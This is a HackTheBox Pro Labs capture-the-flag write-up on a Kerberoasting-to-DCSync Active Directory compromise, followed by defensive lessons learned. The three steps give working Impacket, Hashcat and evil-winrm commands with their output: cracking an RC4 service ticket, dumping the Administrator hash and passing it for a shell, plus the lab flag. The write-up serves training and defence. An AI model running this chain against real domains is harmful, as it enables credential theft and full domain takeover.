---
id: wup-5
title: "HackTheBox: Active Directory Kerberoasting & DCSync Escalation"
slug: htb-kerberoasting-dcsync-escalation
event: HackTheBox Pro Labs // Cybernetics Red Team
platform: HackTheBox
category: Active Directory
difficulty: Hard
author: Jordan Reyes
authorHandle: "@redvector"
authorRole: Red Team Captain
date: NOV 06, 2026
readTime: 6 min read
points: 400
flag: "HTB{k3rb3r04st_t0_dcsync_d0m41n_pwn}"
summary: "Enumerating service principal names (SPNs) with BloodHound CE & Impacket GetUserSPNs, cracking weak RC4 TGS tickets offline with Hashcat, and abusing WriteDacl permissions for full DCSync."
vulnerability: "Weak RC4-encrypted service account password with Kerberoastable SPN (MITRE T1558.003) chained with over-privileged WriteDacl ACL."
tags: [Active Directory, Kerberoasting, Impacket, BloodHound, DCSync]
toolsUsed: [impacket-GetUserSPNs, BloodHound CE, Hashcat, secretsdump.py]
lessonsLearned:
  - "Enforce 25+ character randomized passwords or migrate service accounts to gMSA (Group Managed Service Accounts)."
  - "Disable RC4_HMAC_MD5 (etype 23) encryption for Kerberos service tickets in favor of AES256."
  - "Audit BloodHound ACL attack paths weekly for unintended WriteDacl / GenericAll privileges on the domain root."
---

## Step 1: Enumerating Kerberoastable SPNs

With initial low-privilege domain credentials (`svc_web_read`), we query the Domain Controller for accounts with registered **Service Principal Names (SPNs)** using `impacket-GetUserSPNs`.

```bash
$ impacket-GetUserSPNs cybernetics.local/svc_web_read:'Winter2026!' -dc-ip 10.10.11.42 -request
Impacket v0.12.0 - Copyright Fortra

ServicePrincipalName           Name         MemberOf
-----------------------------  -----------  ------------------------------
MSSQLSvc/db01.cybernetics:1433 svc_sql_prod CN=SQL Admins,CN=Users,DC=...
```

> ✓ Discovered Kerberoastable account `svc_sql_prod` using RC4 (`$krb5tgs$23$*`) encryption.

## Step 2: Offline TGS Ticket Cracking via Hashcat

Because TGS tickets encrypted with RC4 can be cracked offline without triggering Domain Controller account lockouts, we run Hashcat mode `13100` against `rockyou.txt`:

```bash
$ hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt --force
$krb5tgs$23$*svc_sql_prod$CYBERNETICS.LOCAL$...:P@ssw0rdSQL!2024
Status...........: Cracked
```

> ✓ Recovered plaintext credentials: `svc_sql_prod : P@ssw0rdSQL!2024`

## Step 3: BloodHound ACL Path & DCSync Extraction

Ingesting SharpHound JSON into **BloodHound CE** reveals that `SQL Admins` holds `WriteDacl` on the Domain object `DC=cybernetics,DC=local`. Adding `DS-Replication-Get-Changes-All` lets us dump the `NTDS.dit` hashes remotely via `secretsdump.py`:

```bash
$ impacket-secretsdump cybernetics.local/svc_sql_prod:'P@ssw0rdSQL!2024'@10.10.11.42 -just-dc-user Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
$ evil-winrm -i 10.10.11.42 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
HTB{k3rb3r04st_t0_dcsync_d0m41n_pwn}
```
